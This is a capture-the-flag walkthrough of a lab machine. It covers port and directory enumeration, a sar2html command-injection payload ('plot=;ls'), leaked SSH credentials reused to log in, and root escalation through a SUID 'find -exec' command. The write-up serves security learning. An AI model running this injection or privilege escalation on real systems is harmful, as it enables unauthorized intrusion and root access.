### Enum

> nmap -A $TARGET

on nmapres.txt

* port http -> apache

* port ftp:

### FTP
anonymous login:

hidden .info.txt:
```
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl! ----> ROT13 -----> Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

SHM

---


### Full Enum 

> nmap -p- $TARGET

```
Nmap scan report for 10.10.93.225
Host is up (0.096s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
10000/tcp open  snet-sensor-mgmt
55007/tcp open  unknown
```

> nmap -sV -p 21,80,10000,55007 $TARGET

```
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

* Googled : "MiniServ 1.930 exploit" : Nothing interesting
* [Webmin Security patches](http://www.webmin.com/security.html)

So we cannot exploit it properly

### CMS

let's dig into port 80 :

> dirb http://$TARGET

```
==> DIRECTORY: http://10.10.93.225/joomla/
```

Joomla!

Dig more: dirbres.txt

	```
	==> DIRECTORY: http://10.10.93.225/joomla/_archive/                                                
	==> DIRECTORY: http://10.10.93.225/joomla/_database/                                               
	==> DIRECTORY: http://10.10.93.225/joomla/_files/                                                  
	==> DIRECTORY: http://10.10.93.225/joomla/_test/
	```

Some trolling stuff with junk base64s and hashes

also dug into _files directory; Nothing there!
```
---- Scanning URL: http://10.10.93.225/joomla/_files/ ----
+ http://10.10.93.225/joomla/_files/index.html (CODE:200|SIZE:168)
```

#### Joomla/_test

Googled sar2html: Remote Command Execution

	* It runs commends over plot (index.php?plot=) parameter
	* URL injection forman index.php?plot=;$YOUR_COMMAND
	* command output on select Host <select> element

so let's ls;

> http://10.10.93.225/joomla/_test/index.php?plot=;ls

	* log.txt :
	```
	Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
	```
	
found some credintials on ssh ( On port 55007 )

### SSH

bastard:superduperp@$$ on port 55007
> ssh basterd@$TARGET -p 55007

Now we have shell access

> ls -la
> cat backup.sh

```
	.
	.
	.
	USER=stoner
	#superduperp@$$no1knows

	ssh $USER@$REMOTE mkdir $TARGET/$DATE
	.
	.
	.
```

we have found another user's creds :

> su stoner

now we are stoner :)

> ls -la
```
	-rw-r--r-- 1 stoner stoner    34 Aug 21  2019 .secret
```
> cat .secret

It contains the flag for Q#2#2

### PrivEsc
> id

```
	uid=1000(stoner) gid=1000(stoner) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

> sudo -l
```
	User stoner may run the following commands on Vulnerable:
	    (root) NOPASSWD: /NotThisTime/MessinWithYa
```

COOL! fooled again :'(


Gave up and tried LinEnum.sh
	1. transfer it to the target machine via SimpleHTTPServer and chmod +x
	2. ./LinEnum.sh > linenumres
	3. Download if from target machine

Interesting resualts:

```
### SOFTWARE #############################################

[-] MYSQL version:
mysql  Ver 14.14 Distrib 5.7.27, for Linux (i686) using  EditLine wrapper

[+] Possibly interesting SUID files:
-r-sr-xr-x 1 root root 232196 Feb  8  2016 /usr/bin/find
```

MySQL was running locally but useless.
but "find" command, it can execute commands as root via -exec parameter. Because it has the SUID of root set.

> find . -exec ls -la /root \;
> find . -exec cat /root/root.txt \;

and Done!



